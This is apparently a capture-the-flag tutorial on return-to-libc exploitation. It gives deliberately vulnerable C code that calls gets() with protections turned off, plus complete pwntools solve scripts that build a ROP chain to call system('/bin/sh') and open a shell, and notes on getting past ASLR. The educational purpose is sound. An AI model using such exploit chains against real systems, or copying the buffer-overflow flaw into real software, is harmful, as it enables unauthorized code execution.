---
title: "Pwn - Return to Libc"
description: "Bypassing NX by chaining calls to libc functions — calling system(\"/bin/sh\") without injecting any shellcode."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                          |
|------------|--------------------------------|
| Category   | Binary Exploitation            |
| Difficulty | Hard                           |
| Points     | 350                            |
| Flag       | `zemi{r3t2l1bc_byp4ss_nx}`     |

## Challenge Files

Download the challenge files to get started:

- [ret2libc.c](/Website/challenges/pwn-ret2libc/ret2libc.c)
- [Makefile](/Website/challenges/pwn-ret2libc/Makefile)
- [flag.txt](/Website/challenges/pwn-ret2libc/flag.txt)

## Introduction

In the shellcode injection challenge, we placed executable code on the stack and jumped to it. But modern binaries have **NX (No-eXecute)** enabled, which marks the stack as non-executable. If you try to run shellcode on the stack, the CPU raises a segfault.

So how do we get code execution without injecting code? We reuse code that **already exists** in the process's memory. The C standard library — **libc** — is loaded into every C program and contains incredibly useful functions like `system()`, which can execute shell commands. If we can call `system("/bin/sh")`, we get a shell.

This technique is called **ret2libc** (return-to-libc).

## Why Shellcode Fails with NX

```bash
checksec --file=ret2libc
```

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled           <-- stack is NOT executable
    PIE:      No PIE (0x400000)
```

With NX enabled, memory pages are either writable or executable, never both. The stack is writable (for local variables) but not executable. Attempting to execute code on the stack triggers a segfault.

But libc's `.text` section IS executable. Functions like `system()` are sitting right there in memory, ready to be called.

## Vulnerable Source Code

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Compiled: gcc -no-pie -fno-stack-protector -o ret2libc ret2libc.c

void vuln() {
    char buffer[64];
    printf("Enter your message: ");
    gets(buffer);
    printf("You said: %s\n", buffer);
}

int main() {
    printf("=== Ret2Libc Challenge ===\n");
    printf("system() is at: %p\n", system);
    vuln();
    return 0;
}
```

Key observations:
- NX is enabled (no `-z execstack`)
- No PIE — binary addresses are fixed
- No canary — we can freely overflow
- The binary **leaks the address of `system()`** — in a real scenario you would need to leak this yourself, but this challenge makes it easier
- Since `system()` is used in the program (via the leak), it is already resolved in the PLT/GOT

## Step 1 — Understanding the ret2libc Attack

On x86-64 Linux, function arguments are passed in registers (System V ABI):
- 1st argument: `RDI`
- 2nd argument: `RSI`
- 3rd argument: `RDX`

To call `system("/bin/sh")`, we need:
1. Load the address of the string `"/bin/sh"` into `RDI`
2. Call `system()`

We cannot directly set registers from a buffer overflow. Instead, we use **ROP gadgets** — small instruction sequences ending in `ret` that let us control registers using values on the stack.

We need a `pop rdi; ret` gadget. When execution reaches this gadget:
1. `pop rdi` loads the next value from the stack into RDI
2. `ret` pops the next value from the stack into RIP (jumping to `system()`)

Our payload on the stack:

```
[padding: 72 bytes] [pop rdi; ret] ["/bin/sh" addr] [system() addr]
```

## Step 2 — Find the Required Addresses

### Find system() Address

The binary leaks it, but we can also find it:

```python
from pwn import *
elf = ELF('./ret2libc')
libc = elf.libc

# From the binary's PLT (if system is used)
print(hex(elf.plt['system']))   # 0x401040

# Or parse the leak at runtime
```

### Find the "/bin/sh" String

libc contains the string `"/bin/sh"` (it is used internally by `system()` itself):

```bash
strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

```
 1b45bd /bin/sh
```

At runtime, we calculate: `libc_base + 0x1b45bd`.

Since the binary leaks `system()`'s address, we can compute the libc base:

```python
libc_base = leaked_system - libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
```

### Find a "pop rdi; ret" Gadget

```bash
ROPgadget --binary ret2libc | grep "pop rdi"
```

```
0x0000000000401203 : pop rdi ; ret
```

Or use pwntools:

```python
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

If the binary doesn't have `pop rdi; ret`, check libc — it always has it.

### Find a "ret" Gadget (for Stack Alignment)

```python
ret_gadget = rop.find_gadget(['ret'])[0]
```

## Step 3 — Stack Alignment

On x86-64, the stack must be **16-byte aligned** when a `call` instruction executes. `system()` internally uses SSE instructions (`movaps`) that require 16-byte alignment. If the stack is misaligned by 8 bytes, `system()` will crash with a segfault inside `do_system`.

The fix: insert an extra `ret` gadget before `system()`. This pops 8 bytes off the stack, toggling the alignment.

```
[padding] [pop rdi; ret] ["/bin/sh"] [ret] [system()]
                                      ^^^
                                stack alignment fix
```

## Step 4 — Calculate Offset

```gdb
(gdb) disas vuln
   0x0000000000401186 <+0>:     push   rbp
   0x0000000000401187 <+1>:     mov    rbp,rsp
   0x000000000040118a <+4>:     sub    rsp,0x40       # buffer is 64 bytes
   0x000000000040118e <+8>:     lea    rax,[rbp-0x40] # buffer at rbp-0x40
   ...
```

Offset = 64 (buffer) + 8 (saved RBP) = **72 bytes**.

## Step 5 — Verify with GDB

Before running the full exploit, let's trace it in GDB:

```gdb
(gdb) break *vuln+52
(gdb) run <<< $(python3 -c "print('A'*72 + 'BBBBBBBB')")
(gdb) x/gx $rsp
0x7fffffffe3a8:   0x4242424242424242    <-- we control the return address
(gdb) info registers rbp
rbp   0x4141414141414141              <-- saved RBP is overwritten (expected)
```

The return address is at offset 72, confirmed.

## Full pwntools Solve Script

```python
from pwn import *

# Setup
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

elf = ELF('./ret2libc')
libc = elf.libc

# Start the process
p = process('./ret2libc')

# Parse the leaked system() address
p.recvuntil(b"system() is at: ")
leaked_system = int(p.recvline().strip(), 16)
log.info(f"Leaked system(): {hex(leaked_system)}")

# Calculate libc base address
libc_base = leaked_system - libc.symbols['system']
log.info(f"libc base: {hex(libc_base)}")

# Verify alignment (libc base should end in 000)
assert libc_base & 0xfff == 0, "Bad libc base alignment!"

# Find "/bin/sh" in libc
binsh_offset = next(libc.search(b'/bin/sh'))
binsh_addr = libc_base + binsh_offset
log.info(f"/bin/sh @ {hex(binsh_addr)}")

# system() address (from leak)
system_addr = leaked_system
log.info(f"system() @ {hex(system_addr)}")

# Find gadgets in the binary
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]
log.info(f"pop rdi; ret @ {hex(pop_rdi)}")
log.info(f"ret @ {hex(ret)}")

# Build the ROP chain
offset = 72  # 64 (buffer) + 8 (saved RBP)

payload  = b"A" * offset
payload += p64(pop_rdi)      # gadget: pop rdi; ret
payload += p64(binsh_addr)   # argument: pointer to "/bin/sh"
payload += p64(ret)          # stack alignment
payload += p64(system_addr)  # call system("/bin/sh")

log.info(f"Payload size: {len(payload)} bytes")

# Send the payload
p.sendlineafter(b"message: ", payload)

# We now have a shell — read the flag
p.sendline(b"cat flag.txt")
flag = p.recvline(timeout=3).decode().strip()
log.success(f"Flag: {flag}")

p.close()
```

```
[*] Leaked system(): 0x7f1234567890
[*] libc base: 0x7f1234520000
[*] /bin/sh @ 0x7f12346d45bd
[*] system() @ 0x7f1234567890
[*] pop rdi; ret @ 0x401203
[*] ret @ 0x40101a
[*] Payload size: 104 bytes
[+] Flag: zemi{r3t2l1bc_byp4ss_nx}
```

## Alternative: Using pwntools ROP Builder

pwntools has a high-level ROP builder that constructs the chain for you:

```python
from pwn import *

elf = ELF('./ret2libc')
libc = elf.libc

p = process('./ret2libc')

# Parse leak
p.recvuntil(b"system() is at: ")
leaked_system = int(p.recvline().strip(), 16)
libc_base = leaked_system - libc.symbols['system']
libc.address = libc_base   # rebase libc

# Use pwntools ROP builder
rop = ROP(elf)
rop.raw(b"A" * 72)                         # padding
rop.call(libc.symbols['system'],            # call system()
         [next(libc.search(b'/bin/sh'))])   # with "/bin/sh" as argument

payload = rop.chain()
log.info(rop.dump())

p.sendlineafter(b"message: ", payload)
p.sendline(b"cat flag.txt")
print(p.recvline().decode())
p.close()
```

## The Attack Visualized

```
Stack after overflow (growing downward):

Low addresses
+---------------------------+
| buffer (64 bytes of 'A')  |   <-- gets() writes here
+---------------------------+
| saved RBP (8 bytes of 'A')|   <-- overwritten, we don't care
+---------------------------+
| pop rdi; ret (8 bytes)    |   <-- vuln()'s ret pops this into RIP
+---------------------------+
| "/bin/sh" address         |   <-- pop rdi loads this into RDI
+---------------------------+
| ret gadget (8 bytes)      |   <-- stack alignment
+---------------------------+
| system() address          |   <-- final ret jumps here
+---------------------------+
High addresses

Execution flow:
1. vuln() returns -> pops [pop rdi; ret] into RIP
2. pop rdi -> loads "/bin/sh" address into RDI
3. ret -> pops [ret gadget] into RIP
4. ret -> pops [system()] into RIP
5. system() executes with RDI = "/bin/sh"
6. Shell spawned!
```

## Dealing with ASLR

In this challenge, the binary leaks `system()`'s address, which lets us calculate libc's base address even with ASLR enabled. In challenges without a convenient leak, you would need to:

1. **Leak a libc address** — use format string vulnerabilities, partial overwrites, or `puts(got_entry)` via ROP to leak a resolved GOT entry
2. **Calculate offsets** — all libc functions are at fixed offsets from the base
3. **Return to main** — after leaking, use `ret2main` to restart the program and send a second payload with the correct addresses

This two-stage approach is the standard pattern for bypassing ASLR with ret2libc.

## Tools Used

- **checksec** — verify NX is enabled, confirming shellcode injection won't work
- **GDB** — disassemble functions, verify offsets, trace execution
- **ROPgadget** — find `pop rdi; ret` and other gadgets in the binary
- **pwntools** — ELF parsing, libc symbol resolution, ROP gadget finding, process interaction
- **strings** — locate `"/bin/sh"` in libc

## Lessons Learned

- **NX/DEP** prevents code execution on the stack, but it does NOT prevent reusing existing code
- **ret2libc** bypasses NX by calling library functions (`system()`) instead of injecting shellcode
- On **x86-64**, function arguments go in registers (`RDI`, `RSI`, `RDX`), so you need ROP gadgets like `pop rdi; ret` to set them
- **Stack alignment** on x86-64 is critical — `system()` crashes on misaligned stacks due to SSE instructions; use an extra `ret` gadget to fix it
- libc contains `"/bin/sh"` as a string — you do not need to supply your own
- With a **single address leak**, you can calculate the base address of libc and find any function or string within it
- This technique is the foundation for full **ROP chain** exploitation
